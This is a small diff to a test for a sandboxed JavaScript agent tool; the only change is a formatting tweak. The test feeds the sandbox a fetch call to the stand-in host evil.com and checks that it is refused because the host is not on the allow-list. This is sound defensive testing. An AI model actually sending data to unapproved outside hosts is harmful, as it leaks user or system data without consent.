@@ -27,7 +27,7 @@ describe("sandboxedJsAgentTool", () => {
       capabilities: { allowedHosts: ["api.example.com"] },
     });
     await expect(t.execute({ code: "fetch('https://evil.com/data')" })).rejects.toThrow(
-      /CapabilityDenied/,
+      /CapabilityDenied/
     );
   });
 
